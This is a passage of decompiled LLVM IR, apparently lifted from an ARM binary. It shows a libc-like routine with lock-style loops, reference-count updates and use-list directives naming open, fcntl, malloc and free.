  %v1_17d90 = load i32, i32* @r5, align 4
  %v2_17d90 = add i32 %v1_17d90, 28
  %v3_17d90 = inttoptr i32 %v2_17d90 to i32*
  store i32 %v0_17d90, i32* %v3_17d90, align 4
  %v0_17d94 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d94 = load i32, i32* @r5, align 4
  %v2_17d94 = add i32 %v1_17d94, 16
  %v3_17d94 = inttoptr i32 %v2_17d94 to i32*
  store i32 %v0_17d94, i32* %v3_17d94, align 4
  %v0_17d98 = load i32, i32* %r4.global-to-local, align 4
  %v1_17d98 = load i32, i32* @r5, align 4
  %v2_17d98 = add i32 %v1_17d98, 44
  %v3_17d98 = inttoptr i32 %v2_17d98 to i32*
  store i32 %v0_17d98, i32* %v3_17d98, align 4
  br i1 %v2_17d80, label %dec_label_pc_17f80, label %dec_label_pc_17da0

dec_label_pc_17da0:                               ; preds = %bb58
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17da4 = load i32, i32* @r8, align 4
  %v2_17da4 = add i32 %v0_17da4, 160
  %v3_17da4 = inttoptr i32 %v2_17da4 to i32*
  %v4_17da4 = load i32, i32* %v3_17da4, align 4
  store i32 %v4_17da4, i32* %r7.global-to-local, align 4
  %v0_17da8 = call i32 @__aeabi_read_tp()
  store i32 %v0_17da8, i32* %r0.global-to-local, align 4
  %v1_17dac = add i32 %v4_17da4, 8
  %v2_17dac = inttoptr i32 %v1_17dac to i32*
  %v3_17dac = load i32, i32* %v2_17dac, align 4
  store i32 %v3_17dac, i32* %r3.global-to-local, align 4
  %v1_17db0 = add i32 %v0_17da8, -1168
  store i32 %v1_17db0, i32* %r6.global-to-local, align 4
  %v3_17db4 = icmp uge i32 %v3_17dac, %v1_17db0
  store i1 %v3_17db4, i1* %cpsr_c.global-to-local, align 1
  %v9_17db4 = icmp eq i32 %v3_17dac, %v1_17db0
  br i1 %v9_17db4, label %dec_label_pc_17df8, label %dec_label_pc_17dbc

dec_label_pc_17dbc:                               ; preds = %dec_label_pc_17da0
  store i32 %v4_17da4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17dc4

dec_label_pc_17dc4:                               ; preds = %dec_label_pc_17dd0.dec_label_pc_17dc4_crit_edge, %dec_label_pc_17dbc
  %v0_17dc4 = phi i32 [ %v0_17dc4.pre, %dec_label_pc_17dd0.dec_label_pc_17dc4_crit_edge ], [ %v4_17da4, %dec_label_pc_17dbc ]
  %v1_17dc4 = inttoptr i32 %v0_17dc4 to i32*
  %v2_17dc4 = load i32, i32* %v1_17dc4, align 4
  store i32 %v2_17dc4, i32* %r3.global-to-local, align 4
  %v1_17dc8 = load i32, i32* %r4.global-to-local, align 4
  %v3_17dc8 = icmp uge i32 %v2_17dc4, %v1_17dc8
  store i1 %v3_17dc8, i1* %cpsr_c.global-to-local, align 1
  %v9_17dc8 = icmp eq i32 %v2_17dc4, %v1_17dc8
  br i1 %v9_17dc8, label %dec_label_pc_17dd0, label %dec_label_pc_17de8

dec_label_pc_17dd0:                               ; preds = %dec_label_pc_17dc4
  store i32 %v2_17dc4, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17de0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17de0, label %dec_label_pc_17de4, label %dec_label_pc_17dd0.dec_label_pc_17dc4_crit_edge

dec_label_pc_17dd0.dec_label_pc_17dc4_crit_edge:  ; preds = %dec_label_pc_17dd0
  %v0_17dc4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17dc4

dec_label_pc_17de4:                               ; preds = %dec_label_pc_17dd0
  %v0_17de4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17de4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17de8

dec_label_pc_17de8:                               ; preds = %dec_label_pc_17dc4, %dec_label_pc_17de4
  %v0_17de8 = phi i32 [ %v0_17de4, %dec_label_pc_17de4 ], [ %v2_17dc4, %dec_label_pc_17dc4 ]
  %v1_17de8 = phi i32 [ %v0_17de4, %dec_label_pc_17de4 ], [ %v1_17dc8, %dec_label_pc_17dc4 ]
  %v3_17de8 = icmp uge i32 %v0_17de8, %v1_17de8
  store i1 %v3_17de8, i1* %cpsr_c.global-to-local, align 1
  %v9_17de8 = icmp eq i32 %v0_17de8, %v1_17de8
  br i1 %v9_17de8, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_17de8
  %v1_17dec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17dec, i32* %r0.global-to-local, align 4
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_17de8, %bb59
  %v1_17df0 = xor i1 %v9_17de8, true
  call void @__pseudo_cond_branch(i1 %v1_17df0, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_17df4 = load i32, i32* %r6.global-to-local, align 4
  %v1_17df4 = load i32, i32* %r7.global-to-local, align 4
  %v2_17df4 = add i32 %v1_17df4, 8
  %v3_17df4 = inttoptr i32 %v2_17df4 to i32*
  store i32 %v0_17df4, i32* %v3_17df4, align 4
  %v1_17e14.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17df8

dec_label_pc_17df8:                               ; preds = %dec_label_pc_17da0, %bb60
  %v1_17e14 = phi i32 [ %v3_17dac, %dec_label_pc_17da0 ], [ %v1_17e14.pre, %bb60 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17dfc = load i32, i32* @r8, align 4
  %v2_17dfc = add i32 %v0_17dfc, 160
  %v3_17dfc = inttoptr i32 %v2_17dfc to i32*
  %v4_17dfc = load i32, i32* %v3_17dfc, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17e04 = add i32 %v0_17dfc, 152
  %v3_17e04 = inttoptr i32 %v2_17e04 to i32*
  %v4_17e04 = load i32, i32* %v3_17e04, align 4
  store i32 %v4_17e04, i32* %r7.global-to-local, align 4
  %v1_17e08 = add i32 %v4_17dfc, 4
  %v2_17e08 = inttoptr i32 %v1_17e08 to i32*
  %v3_17e08 = load i32, i32* %v2_17e08, align 4
  store i32 %v3_17e08, i32* %r3.global-to-local, align 4
  %v1_17e0c = add i32 %v4_17e04, 8
  %v2_17e0c = inttoptr i32 %v1_17e0c to i32*
  %v3_17e0c = load i32, i32* %v2_17e0c, align 4
  store i32 %v3_17e0c, i32* %r2.global-to-local, align 4
  %v1_17e10 = add i32 %v3_17e08, 1
  store i32 %v1_17e10, i32* %r3.global-to-local, align 4
  %v3_17e14 = icmp uge i32 %v3_17e0c, %v1_17e14
  store i1 %v3_17e14, i1* %cpsr_c.global-to-local, align 1
  %v9_17e14 = icmp eq i32 %v3_17e0c, %v1_17e14
  store i32 %v1_17e10, i32* %v2_17e08, align 4
  br i1 %v9_17e14, label %dec_label_pc_17e60, label %dec_label_pc_17e20

dec_label_pc_17e20:                               ; preds = %dec_label_pc_17df8
  %v0_17e24 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17e24, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_17e2c96 = inttoptr i32 %v0_17e24 to i32*
  %v2_17e2c97 = load i32, i32* %v1_17e2c96, align 4
  store i32 %v2_17e2c97, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17e3099 = icmp eq i32 %v2_17e2c97, 0
  br i1 %v9_17e3099, label %dec_label_pc_17e38, label %dec_label_pc_17e50

dec_label_pc_17e38:                               ; preds = %dec_label_pc_17e20, %dec_label_pc_17e38.dec_label_pc_17e2c_crit_edge
  %v0_17e38100 = phi i32 [ %v1_17e30.pre, %dec_label_pc_17e38.dec_label_pc_17e2c_crit_edge ], [ 0, %dec_label_pc_17e20 ]
  store i32 %v0_17e38100, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17e48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17e48, label %dec_label_pc_17e4c, label %dec_label_pc_17e38.dec_label_pc_17e2c_crit_edge

dec_label_pc_17e38.dec_label_pc_17e2c_crit_edge:  ; preds = %dec_label_pc_17e38
  %v0_17e2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17e30.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17e2c = inttoptr i32 %v0_17e2c.pre to i32*
  %v2_17e2c = load i32, i32* %v1_17e2c, align 4
  store i32 %v2_17e2c, i32* %r3.global-to-local, align 4
  %v3_17e30 = icmp uge i32 %v2_17e2c, %v1_17e30.pre
  store i1 %v3_17e30, i1* %cpsr_c.global-to-local, align 1
  %v9_17e30 = icmp eq i32 %v2_17e2c, %v1_17e30.pre
  br i1 %v9_17e30, label %dec_label_pc_17e38, label %dec_label_pc_17e50

dec_label_pc_17e4c:                               ; preds = %dec_label_pc_17e38
  %v0_17e4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17e4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17e50

dec_label_pc_17e50:                               ; preds = %dec_label_pc_17e20, %dec_label_pc_17e38.dec_label_pc_17e2c_crit_edge, %dec_label_pc_17e4c
  %v0_17e50 = phi i32 [ %v0_17e4c, %dec_label_pc_17e4c ], [ %v2_17e2c97, %dec_label_pc_17e20 ], [ %v2_17e2c, %dec_label_pc_17e38.dec_label_pc_17e2c_crit_edge ]
  %v1_17e50 = phi i32 [ %v0_17e4c, %dec_label_pc_17e4c ], [ 0, %dec_label_pc_17e20 ], [ %v1_17e30.pre, %dec_label_pc_17e38.dec_label_pc_17e2c_crit_edge ]
  %v3_17e50 = icmp uge i32 %v0_17e50, %v1_17e50
  store i1 %v3_17e50, i1* %cpsr_c.global-to-local, align 1
  %v9_17e50 = icmp eq i32 %v0_17e50, %v1_17e50
  br i1 %v9_17e50, label %bb62, label %bb61

bb61:                                             ; preds = %dec_label_pc_17e50
  %v1_17e54 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17e54, i32* %r0.global-to-local, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_17e50, %bb61
  %v1_17e58 = xor i1 %v9_17e50, true
  call void @__pseudo_cond_branch(i1 %v1_17e58, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_17e5c = load i32, i32* %r6.global-to-local, align 4
  %v1_17e5c = load i32, i32* %r7.global-to-local, align 4
  %v2_17e5c = add i32 %v1_17e5c, 8
  %v3_17e5c = inttoptr i32 %v2_17e5c to i32*
  store i32 %v0_17e5c, i32* %v3_17e5c, align 4
  br label %dec_label_pc_17e60

dec_label_pc_17e60:                               ; preds = %dec_label_pc_17df8, %bb62
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17e64 = load i32, i32* @r8, align 4
  %v2_17e64 = add i32 %v0_17e64, 152
  %v3_17e64 = inttoptr i32 %v2_17e64 to i32*
  %v4_17e64 = load i32, i32* %v3_17e64, align 4
  store i32 %v4_17e64, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_17e6c = add i32 %v0_17e64, 76
  %v3_17e6c = inttoptr i32 %v2_17e6c to i32*
  %v4_17e6c = load i32, i32* %v3_17e6c, align 4
  store i32 %v4_17e6c, i32* @r1, align 4
  %v1_17e70 = add i32 %v4_17e64, 4
  %v2_17e70 = inttoptr i32 %v1_17e70 to i32*
  %v3_17e70 = load i32, i32* %v2_17e70, align 4
  store i32 %v3_17e70, i32* %r3.global-to-local, align 4
  %v1_17e74 = inttoptr i32 %v4_17e6c to i32*
  %v2_17e74 = load i32, i32* %v1_17e74, align 4
  store i32 %v2_17e74, i32* %r2.global-to-local, align 4
  %v1_17e78 = add i32 %v3_17e70, 1
  store i32 %v1_17e78, i32* %r3.global-to-local, align 4
  store i32 %v1_17e78, i32* %v2_17e70, align 4
  %v0_17e80 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e80 = load i32, i32* @r5, align 4
  %v2_17e80 = add i32 %v1_17e80, 32
  %v3_17e80 = inttoptr i32 %v2_17e80 to i32*
  store i32 %v0_17e80, i32* %v3_17e80, align 4
  %v0_17e84 = load i32, i32* %r0.global-to-local, align 4
  %v1_17e84 = add i32 %v0_17e84, 4
  %v2_17e84 = inttoptr i32 %v1_17e84 to i32*
  %v3_17e84 = load i32, i32* %v2_17e84, align 4
  %v1_17e88 = add i32 %v3_17e84, -1
  store i32 %v1_17e88, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17e8c = icmp eq i32 %v1_17e88, 0
  %v0_17e90 = load i32, i32* @r5, align 4
  %v1_17e90 = load i32, i32* @r1, align 4
  %v2_17e90 = inttoptr i32 %v1_17e90 to i32*
  store i32 %v0_17e90, i32* %v2_17e90, align 4
  %v0_17e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e94 = load i32, i32* %r0.global-to-local, align 4
  %v2_17e94 = add i32 %v1_17e94, 4
  %v3_17e94 = inttoptr i32 %v2_17e94 to i32*
  store i32 %v0_17e94, i32* %v3_17e94, align 4
  br i1 %v2_17e8c, label %dec_label_pc_17e9c, label %dec_label_pc_17efc

dec_label_pc_17e9c:                               ; preds = %dec_label_pc_17e60
  %v0_17e9c = load i32, i32* %r3.global-to-local, align 4
  %v1_17e9c = load i32, i32* %r0.global-to-local, align 4
  %v2_17e9c = add i32 %v1_17e9c, 8
  %v3_17e9c = inttoptr i32 %v2_17e9c to i32*
  store i32 %v0_17e9c, i32* %v3_17e9c, align 4
  %v0_17ea0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17ea0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17ea4

dec_label_pc_17ea4:                               ; preds = %dec_label_pc_17ed4.dec_label_pc_17ea4_crit_edge, %dec_label_pc_17e9c
  %v0_17ea4 = phi i32 [ %v0_17ea4.pre, %dec_label_pc_17ed4.dec_label_pc_17ea4_crit_edge ], [ %v0_17ea0, %dec_label_pc_17e9c ]
  %v1_17ea4 = inttoptr i32 %v0_17ea4 to i32*
  %v2_17ea4 = load i32, i32* %v1_17ea4, align 4
  store i32 %v2_17ea4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_17ea4, i32* %r2.global-to-local, align 4
  %v2_17eb084 = load i32, i32* %v1_17ea4, align 4
  store i32 %v2_17eb084, i32* %r3.global-to-local, align 4
  %v3_17eb486 = icmp uge i32 %v2_17eb084, %v2_17ea4
  store i1 %v3_17eb486, i1* %cpsr_c.global-to-local, align 1
  %v9_17eb492 = icmp eq i32 %v2_17eb084, %v2_17ea4
  br i1 %v9_17eb492, label %dec_label_pc_17ebc, label %dec_label_pc_17ed4

dec_label_pc_17ebc:                               ; preds = %dec_label_pc_17ea4, %dec_label_pc_17ebc.dec_label_pc_17eb0_crit_edge
  %v0_17ebc93 = phi i32 [ %v1_17eb4.pre, %dec_label_pc_17ebc.dec_label_pc_17eb0_crit_edge ], [ %v2_17ea4, %dec_label_pc_17ea4 ]
  store i32 %v0_17ebc93, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17ecc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17ecc, label %dec_label_pc_17ed0, label %dec_label_pc_17ebc.dec_label_pc_17eb0_crit_edge

dec_label_pc_17ebc.dec_label_pc_17eb0_crit_edge:  ; preds = %dec_label_pc_17ebc
  %v0_17eb0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17eb4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17eb0 = inttoptr i32 %v0_17eb0.pre to i32*
  %v2_17eb0 = load i32, i32* %v1_17eb0, align 4
  store i32 %v2_17eb0, i32* %r3.global-to-local, align 4
  %v3_17eb4 = icmp uge i32 %v2_17eb0, %v1_17eb4.pre
  store i1 %v3_17eb4, i1* %cpsr_c.global-to-local, align 1
  %v9_17eb4 = icmp eq i32 %v2_17eb0, %v1_17eb4.pre
  br i1 %v9_17eb4, label %dec_label_pc_17ebc, label %dec_label_pc_17ed4

dec_label_pc_17ed0:                               ; preds = %dec_label_pc_17ebc
  %v0_17ed0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17ed0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17ed4

dec_label_pc_17ed4:                               ; preds = %dec_label_pc_17ea4, %dec_label_pc_17ebc.dec_label_pc_17eb0_crit_edge, %dec_label_pc_17ed0
  %v0_17edc = phi i32 [ %v0_17ed0, %dec_label_pc_17ed0 ], [ %v2_17eb084, %dec_label_pc_17ea4 ], [ %v2_17eb0, %dec_label_pc_17ebc.dec_label_pc_17eb0_crit_edge ]
  %v1_17ed4 = phi i32 [ %v0_17ed0, %dec_label_pc_17ed0 ], [ %v2_17ea4, %dec_label_pc_17ea4 ], [ %v1_17eb4.pre, %dec_label_pc_17ebc.dec_label_pc_17eb0_crit_edge ]
  %v3_17ed4 = icmp uge i32 %v0_17edc, %v1_17ed4
  store i1 %v3_17ed4, i1* %cpsr_c.global-to-local, align 1
  %v9_17ed4 = icmp eq i32 %v0_17edc, %v1_17ed4
  br i1 %v9_17ed4, label %dec_label_pc_17edc, label %dec_label_pc_17ed4.dec_label_pc_17ea4_crit_edge

dec_label_pc_17ed4.dec_label_pc_17ea4_crit_edge:  ; preds = %dec_label_pc_17ed4
  %v0_17ea4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17ea4

dec_label_pc_17edc:                               ; preds = %dec_label_pc_17ed4
  %v2_17edc = icmp ne i32 %v1_17ed4, 0
  store i1 %v2_17edc, i1* %cpsr_c.global-to-local, align 1
  %v7_17ee0 = icmp slt i32 %v1_17ed4, 2
  br i1 %v7_17ee0, label %dec_label_pc_17efc, label %dec_label_pc_17ee4

dec_label_pc_17ee4:                               ; preds = %dec_label_pc_17edc
  %v0_17ee4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17ee4, i32* %r0.global-to-local, align 4
  %v0_17ee8 = load i32, i32* @r1, align 4
  %v1_17ee8 = add i32 %v0_17ee8, 129
  store i32 %v1_17ee8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17efc

dec_label_pc_17efc:                               ; preds = %dec_label_pc_17e60, %dec_label_pc_17ee4, %dec_label_pc_17edc
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17f00 = load i32, i32* @r8, align 4
  %v2_17f00 = add i32 %v0_17f00, 160
  %v3_17f00 = inttoptr i32 %v2_17f00 to i32*
  %v4_17f00 = load i32, i32* %v3_17f00, align 4
  store i32 %v4_17f00, i32* %r0.global-to-local, align 4
  %v1_17f04 = add i32 %v4_17f00, 4
  %v2_17f04 = inttoptr i32 %v1_17f04 to i32*
  %v3_17f04 = load i32, i32* %v2_17f04, align 4
  %v1_17f08 = add i32 %v3_17f04, -1
  store i32 %v1_17f08, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17f0c = icmp eq i32 %v1_17f08, 0
  store i32 %v1_17f08, i32* %v2_17f04, align 4
  br i1 %v2_17f0c, label %dec_label_pc_17f18, label %dec_label_pc_17f80

dec_label_pc_17f18:                               ; preds = %dec_label_pc_17efc
  %v0_17f18 = load i32, i32* %r3.global-to-local, align 4
  %v1_17f18 = load i32, i32* %r0.global-to-local, align 4
  %v2_17f18 = add i32 %v1_17f18, 8
  %v3_17f18 = inttoptr i32 %v2_17f18 to i32*
  store i32 %v0_17f18, i32* %v3_17f18, align 4
  %v0_17f1c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17f1c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17f20

dec_label_pc_17f20:                               ; preds = %dec_label_pc_17f50.dec_label_pc_17f20_crit_edge, %dec_label_pc_17f18
  %v0_17f20 = phi i32 [ %v0_17f20.pre, %dec_label_pc_17f50.dec_label_pc_17f20_crit_edge ], [ %v0_17f1c, %dec_label_pc_17f18 ]
  %v1_17f20 = inttoptr i32 %v0_17f20 to i32*
  %v2_17f20 = load i32, i32* %v1_17f20, align 4
  store i32 %v2_17f20, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_17f20, i32* %r2.global-to-local, align 4
  %v2_17f2c72 = load i32, i32* %v1_17f20, align 4
  store i32 %v2_17f2c72, i32* %r3.global-to-local, align 4
  %v3_17f3074 = icmp uge i32 %v2_17f2c72, %v2_17f20
  store i1 %v3_17f3074, i1* %cpsr_c.global-to-local, align 1
  %v9_17f3080 = icmp eq i32 %v2_17f2c72, %v2_17f20
  br i1 %v9_17f3080, label %dec_label_pc_17f38, label %dec_label_pc_17f50

dec_label_pc_17f38:                               ; preds = %dec_label_pc_17f20, %dec_label_pc_17f38.dec_label_pc_17f2c_crit_edge
  %v0_17f3881 = phi i32 [ %v1_17f30.pre, %dec_label_pc_17f38.dec_label_pc_17f2c_crit_edge ], [ %v2_17f20, %dec_label_pc_17f20 ]
  store i32 %v0_17f3881, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17f48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17f48, label %dec_label_pc_17f4c, label %dec_label_pc_17f38.dec_label_pc_17f2c_crit_edge

dec_label_pc_17f38.dec_label_pc_17f2c_crit_edge:  ; preds = %dec_label_pc_17f38
  %v0_17f2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17f30.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17f2c = inttoptr i32 %v0_17f2c.pre to i32*
  %v2_17f2c = load i32, i32* %v1_17f2c, align 4
  store i32 %v2_17f2c, i32* %r3.global-to-local, align 4
  %v3_17f30 = icmp uge i32 %v2_17f2c, %v1_17f30.pre
  store i1 %v3_17f30, i1* %cpsr_c.global-to-local, align 1
  %v9_17f30 = icmp eq i32 %v2_17f2c, %v1_17f30.pre
  br i1 %v9_17f30, label %dec_label_pc_17f38, label %dec_label_pc_17f50

dec_label_pc_17f4c:                               ; preds = %dec_label_pc_17f38
  %v0_17f4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17f4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17f50

dec_label_pc_17f50:                               ; preds = %dec_label_pc_17f20, %dec_label_pc_17f38.dec_label_pc_17f2c_crit_edge, %dec_label_pc_17f4c
  %v0_17f58 = phi i32 [ %v0_17f4c, %dec_label_pc_17f4c ], [ %v2_17f2c72, %dec_label_pc_17f20 ], [ %v2_17f2c, %dec_label_pc_17f38.dec_label_pc_17f2c_crit_edge ]
  %v1_17f50 = phi i32 [ %v0_17f4c, %dec_label_pc_17f4c ], [ %v2_17f20, %dec_label_pc_17f20 ], [ %v1_17f30.pre, %dec_label_pc_17f38.dec_label_pc_17f2c_crit_edge ]
  %v3_17f50 = icmp uge i32 %v0_17f58, %v1_17f50
  store i1 %v3_17f50, i1* %cpsr_c.global-to-local, align 1
  %v9_17f50 = icmp eq i32 %v0_17f58, %v1_17f50
  br i1 %v9_17f50, label %dec_label_pc_17f58, label %dec_label_pc_17f50.dec_label_pc_17f20_crit_edge

dec_label_pc_17f50.dec_label_pc_17f20_crit_edge:  ; preds = %dec_label_pc_17f50
  %v0_17f20.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17f20

dec_label_pc_17f58:                               ; preds = %dec_label_pc_17f50
  %v2_17f58 = icmp ne i32 %v1_17f50, 0
  store i1 %v2_17f58, i1* %cpsr_c.global-to-local, align 1
  %v7_17f5c = icmp slt i32 %v1_17f50, 2
  br i1 %v7_17f5c, label %dec_label_pc_17f80, label %dec_label_pc_17f60

dec_label_pc_17f60:                               ; preds = %dec_label_pc_17f58
  %v0_17f60 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17f60, i32* %r0.global-to-local, align 4
  %v0_17f64 = load i32, i32* @r1, align 4
  %v1_17f64 = add i32 %v0_17f64, 129
  store i32 %v1_17f64, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17f80

dec_label_pc_17f7c:                               ; preds = %dec_label_pc_17bc0, %dec_label_pc_17ba4, %dec_label_pc_17bcc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_17f80

dec_label_pc_17f80:                               ; preds = %dec_label_pc_17efc, %bb58, %dec_label_pc_17c04, %dec_label_pc_17f58, %dec_label_pc_17f60, %dec_label_pc_17f7c
  %v0_17f80 = load i32, i32* @r5, align 4
  store i32 %v0_17f80, i32* %r0.global-to-local, align 4
  %v2_17f88 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17f88, i32* %r4.global-to-local, align 4
  store i32 %v6_17b64, i32* @r5, align 4
  store i32 %v9_17b64, i32* @r6, align 4
  store i32 %v12_17b64, i32* @r7, align 4
  store i32 %v15_17b64, i32* @r8, align 4
  ret i32 %v0_17f80

; uselistorder directives
  uselistorder i32 %v0_17f4c, { 1, 0, 2 }
  uselistorder i32 %v1_17f30.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17f20, { 1, 0 }
  uselistorder i32 %v0_17ed0, { 1, 0, 2 }
  uselistorder i32 %v1_17eb4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17ea4, { 1, 0 }
  uselistorder i32 %v0_17e4c, { 1, 0, 2 }
  uselistorder i32 %v1_17e30.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17de4, { 1, 0, 2 }
  uselistorder i32 %v1_17dc8, { 0, 2, 1 }
  uselistorder i32 %v4_17da4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_17d54.pre, { 2, 1, 0 }
  uselistorder i32 %v0_17cd8, { 1, 2, 0 }
  uselistorder i32 %v1_17c68, { 1, 0 }
  uselistorder i32 %v0_17c68, { 1, 0 }
  uselistorder i32 %v1_17c50, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17bf4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 7, 8, 9, 10, 11, 13, 12, 14, 2, 1, 0, 3, 5, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r4.global-to-local, { 8, 9, 10, 11, 13, 12, 14, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 31, 32, 34, 33, 51, 35, 36, 37, 38, 39, 41, 40, 52, 43, 42, 44, 45, 46, 47, 48, 49, 1, 50, 53, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29, 30 }
  uselistorder i32* %r2.global-to-local, { 16, 17, 18, 19, 20, 21, 22, 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r0.global-to-local, { 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25, 27, 28, 0, 1, 2, 3, 4, 5, 7, 6, 11, 8, 9, 10, 12, 13, 14 }
  uselistorder i1* %cpsr_c.global-to-local, { 23, 24, 25, 32, 33, 26, 27, 28, 29, 34, 35, 30, 31, 0, 36, 37, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 16384, { 68, 69, 0, 70, 31, 61, 32, 62, 33, 63, 34, 64, 35, 65, 36, 66, 14, 67, 1, 45, 27, 49, 28, 50, 26, 46, 29, 47, 30, 48, 2, 51, 3, 52, 4, 53, 5, 54, 6, 55, 7, 56, 8, 57, 9, 58, 10, 59, 11, 60, 37, 71, 12, 72, 13, 73, 16, 74, 39, 75, 40, 76, 41, 77, 15, 78, 38, 79, 80, 17, 81, 18, 82, 19, 83, 42, 84, 20, 85, 21, 86, 23, 87, 22, 88, 24, 89, 25, 90, 44, 91, 92, 93, 43, 94 }
  uselistorder i32 (i32, i64*)* @__libc_open, { 0, 6, 4, 5, 1, 2, 3 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 14, 0, 13, 10, 9, 12, 11, 6, 5, 4, 3, 8, 7, 2, 1 }
  uselistorder i32 1024, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 ()* @malloc, { 72, 71, 70, 4, 3, 2, 0, 1, 6, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 ()* @free, { 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_17f80, { 5, 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17f7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17f50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17f38, { 1, 0 }
  uselistorder label %dec_label_pc_17efc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17ed4, { 2, 1, 0 }
